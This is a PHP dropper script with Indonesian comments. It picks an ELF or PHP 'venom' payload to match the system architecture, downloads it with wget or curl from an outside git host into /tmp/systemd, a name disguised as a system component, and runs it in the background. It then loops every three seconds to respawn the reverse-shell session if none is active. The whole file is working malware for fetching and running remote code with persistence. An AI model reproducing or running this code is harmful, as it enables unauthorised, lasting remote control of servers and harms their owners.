kira1406<?php

// URL untuk mengunduh payload sesuai dengan arsitektur sistem
function getPayloadUrl() {
    $arch = php_uname('m'); // Dapatkan arsitektur sistem (x86_64 untuk 64-bit, i386 untuk 32-bit)

    if (strpos($arch, '64') !== false) {
        return 'https://git.warceuproject.org/syn/wSploitHub/raw/branch/main/payload/msf/elf/venom64.elf'; // 64-bit payload
    } else {
        return 'https://git.warceuproject.org/syn/wSploitHub/raw/branch/main/payload/msf/elf/venom32.elf'; // 32-bit payload
    }
}

// URL fallback jika ELF tidak bisa dijalankan
$phpPayloadUrl = 'https://git.warceuproject.org/syn/wSploitHub/raw/branch/main/payload/msf/php/venom.php';

// Fungsi untuk menjalankan perintah dan memeriksa exit code
function runCommand() {
    // Periksa apakah file systemd ada di /tmp
    if (!file_exists('/tmp/systemd')) {
        echo "[*] Payload tidak ditemukan. Mengunduh...\n";
        downloadPayload();
    }

    // Perintah untuk dijalankan
    $command = 'php /tmp/systemd'; // Menjalankan file yang diunduh sebagai systemd
    exec($command, $output, $exitCode);

    echo "Command executed: $command\n";
    echo "Exit code: $exitCode\n";

    // Hanya jalan jika exit code non-zero
    if ($exitCode !== 0) {
        echo "[*] Exit code non-zero detected ($exitCode). Checking active session...\n";

        // Cek apakah reverse shell sudah berjalan
        $isShellActive = false;
        exec("ps aux | grep 'php /tmp/systemd' | grep -v grep", $shellOutput);
        if (!empty($shellOutput)) {
            echo "[*] Active session detected. Skipping payload execution.\n";
            $isShellActive = true;
        }

        // Jika tidak ada session aktif, jalankan payload
        if (!$isShellActive) {
            echo "[*] No active session detected. Spawning payload...\n";
            exec("nohup php /tmp/systemd > /dev/null 2>&1 &");
        }
    } else {
        echo "[*] Exit code zero. No payload executed.\n";
    }
}

// Fungsi untuk mengunduh payload.php jika tidak ada
function downloadPayload() {
    // Dapatkan URL payload yang sesuai
    $payloadUrl = getPayloadUrl();

    // Cek ketersediaan wget
    $wgetAvailable = shell_exec('which wget');
    // Cek ketersediaan curl
    $curlAvailable = shell_exec('which curl');

    if (!empty($wgetAvailable)) {
        echo "[*] wget tersedia. Mengunduh payload...\n";
        exec("wget $payloadUrl -O /tmp/systemd");
    } elseif (!empty($curlAvailable)) {
        echo "[*] curl tersedia. Mengunduh payload...\n";
        exec("curl -o /tmp/systemd $payloadUrl");
    } else {
        echo "[!] Tidak ada wget atau curl tersedia untuk mengunduh payload.\n";
    }

    // Jika ELF tidak dapat dijalankan, gunakan fallback payload PHP
    if (!isExecutable('/tmp/systemd')) {
        echo "[*] Payload ELF tidak dapat dijalankan. Mengunduh fallback PHP payload...\n";
        exec("curl -o /tmp/systemd $GLOBALS[phpPayloadUrl]");
    }
}

// Fungsi untuk memeriksa apakah file dapat dieksekusi
function isExecutable($file) {
    return is_executable($file) && file_exists($file);
}

// Fungsi untuk memastikan skrip berjalan terus menerus
function runPersistently() {
    while (true) {
        runCommand(); // Jalankan perintah
        sleep(3); // Tunggu selama 3 detik sebelum mencoba lagi
    }
}

// Mulai menjalankan perintah secara terus menerus
runPersistently();

?>
kira1406